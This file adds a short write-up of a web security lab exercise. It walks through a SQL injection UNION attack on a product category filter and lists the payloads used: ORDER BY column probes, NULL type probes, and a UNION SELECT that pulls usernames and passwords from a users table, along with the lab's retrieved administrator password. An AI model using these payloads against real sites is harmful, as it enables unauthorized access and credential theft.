@@ -1,0 +1,35 @@
+Lab #5 SQL injection UNION attack, retrieving data from other tables
+
+SQLi - Product category filter
+
+END GOAL:
+    Output the usernames and passwords in the users table and login as the administrator user.
+--------------------------------------------------------------------------------------------------------
+
+
+Steps:
+
+1. Determine the number of columns.
+    --> use Order by clause.
+
+'Order by 1--   => 200OK
+'Order by 2--   => 200OK
+'Order by 3--   => Internal server Error
+
+2. Determine the data type of the columns.
+    --> use NULL statements and put a text instead of NULL in one of the NULL statement.
+
+' UNION select NULL, NULL--
+' UNION select 'a', NULL--  => 200OK
+' UNION select 'a', 'a'--  => 200OK
+
+therefore both the columns are of data type text.
+
+3. Get usernames and passwords from the users table.
+
+' UNION select username, password from users--
+
+administrator
+ttf50pwp1lc65mg6pd8s
+
+==> You will get these both values in between the paragraphs that are outputed.
